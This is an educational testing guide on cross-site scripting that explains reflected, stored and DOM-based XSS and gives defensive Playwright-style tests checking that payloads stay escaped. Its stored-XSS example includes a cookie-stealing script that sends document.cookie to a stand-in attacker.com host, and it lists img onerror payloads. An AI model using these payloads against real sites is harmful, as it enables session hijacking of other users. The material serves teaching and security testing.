# XSS Testing

## What It Is

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious script into content that's later rendered by another user's browser, letting the attacker's script execute in that victim's session — potentially stealing session cookies, defacing the page, or performing actions as the victim. There are three main types: **reflected** (input immediately echoed back in the response), **stored** (malicious input saved and later served to other users), and **DOM-based** (client-side JavaScript unsafely inserts data into the page without any server round-trip).

## Why It Matters

- Unlike SQL injection (which targets the backend/database), XSS targets *other users* of the application — a successful stored XSS attack can compromise every user who views the affected page, making it a genuinely different and often broader-impact risk category.
- Stored XSS is generally more severe than reflected XSS, since it doesn't require tricking a specific victim into clicking a crafted link — it just requires the victim to view a page that already contains the attacker's payload, making it worth prioritizing testing effort accordingly.
- Modern frameworks (React, Vue, Angular) auto-escape output by default, significantly reducing but not eliminating XSS risk — understanding *where* that protection can still be bypassed (dangerouslySetInnerHTML, v-html, direct DOM manipulation) is genuinely useful, practical knowledge for a modern SDET.

## How It Works

**Reflected XSS** — malicious script is included in a request (often a URL parameter) and immediately reflected back in the response without proper sanitization:
```text
https://example.com/search?q=<script>alert('XSS')</script>
```
If the search results page renders the query term unescaped, the script executes in the victim's browser the moment they click a crafted link containing this payload.

**Stored XSS** — malicious script is saved (e.g., in a comment, a profile bio, a product review) and later rendered to any user who views that content:
```text
A comment field is submitted with: <script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
If comments are rendered without escaping, EVERY user who views this
comment has the script execute in their browser, potentially
exfiltrating their session cookie to the attacker.
```

**DOM-based XSS** — the vulnerability exists entirely in client-side JavaScript that unsafely inserts untrusted data into the DOM (e.g., using `innerHTML` with unsanitized user input), without the malicious payload ever necessarily passing through the server.

## Example

**Testing for reflected XSS in a search feature:**
```python
def test_search_reflects_query_safely(page):
    xss_payload = "<script>window.__xssTriggered = true</script>"
    page.goto(f"/search?q={xss_payload}")

    # If the payload executed, this global variable would be set —
    # a SAFE application never lets this happen, because the input
    # should be escaped/rendered as literal text, not executed as script
    triggered = page.evaluate("() => window.__xssTriggered")
    assert triggered is None

    # Also verify the payload appears as ESCAPED text in the page
    # (visible as literal characters), not as an executing script tag
    page_content = page.content()
    assert "&lt;script&gt;" in page_content or xss_payload not in page_content
```

**Testing for stored XSS in a comment/review feature:**
```python
def test_comment_field_escapes_stored_script_content(page, api_context):
    xss_payload = "<img src=x onerror=\"window.__xssTriggered=true\">"

    api_context.post("/api/products/101/reviews", data={
        "text": xss_payload,
        "rating": 5,
    })

    # A DIFFERENT session views the page where this comment now renders —
    # simulating another user viewing the stored malicious content
    page.goto("/products/101")

    triggered = page.evaluate("() => window.__xssTriggered")
    assert triggered is None, "Stored XSS payload executed — comment content was not escaped"
```

**A locator-safety note connecting back to earlier folder content** — using `innerHTML`/similar in test automation itself can accidentally mirror the same unsafe pattern being tested for:
```typescript
// In application code (not test code), a common DOM-based XSS source:
element.innerHTML = userSuppliedContent;   // UNSAFE if not sanitized

// The safe alternative most frameworks encourage:
element.textContent = userSuppliedContent;   // always rendered as literal text, never executed
```

## Production Considerations

- Test every place user-generated content is later displayed to other users (comments, reviews, profile fields, usernames) for stored XSS specifically — this is a broader, systematic testing need beyond a single obvious input field, since any field ever rendered back to other users is a potential vector.
- Content Security Policy (CSP) headers (see [Security Headers & Configuration Testing](./security-headers-and-configuration-testing.md)) provide a meaningful defense-in-depth layer against XSS even if an escaping bug exists — worth testing as a complementary control, not a substitute for proper output escaping.
- Modern frontend frameworks' default auto-escaping significantly reduces routine XSS risk, but explicitly flag and test any code using "dangerous" escape hatches (`dangerouslySetInnerHTML` in React, `v-html` in Vue) — these are exactly where a framework's default protection is deliberately bypassed.

## Common Pitfalls

- Testing only for reflected XSS via a URL parameter and not systematically checking stored content fields (comments, profile data) that render to other users — stored XSS is often the more severe, more overlooked category.
- Assuming a modern framework's default auto-escaping makes an application fully immune to XSS, missing the deliberate escape hatches (`dangerouslySetInnerHTML`, `v-html`, raw DOM manipulation) that bypass that protection.
- Checking only whether a payload's `<script>` tag executes, missing event-handler-based payloads (`<img src=x onerror=...>`) that don't rely on a literal `<script>` tag at all — a narrow payload test set gives false confidence, mirroring the same lesson from [Injection Attacks & Testing](./injection-attacks-and-testing.md).
- Not testing across different rendering contexts (a comment shown in a list view vs. a detail view vs. an email notification) — escaping applied correctly in one context isn't guaranteed to be applied in every context the same content might be rendered in.

## Interview Notes

- Be ready to distinguish reflected, stored, and DOM-based XSS precisely, including why stored XSS is generally considered more severe.
- Understand why modern frameworks reduce but don't eliminate XSS risk, and be able to name specific escape hatches (`dangerouslySetInnerHTML`, `v-html`) worth flagging in code review or targeted testing.
- Be able to describe a systematic approach to testing for stored XSS across an application's user-generated content fields, rather than checking just one obvious field.

## References

- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)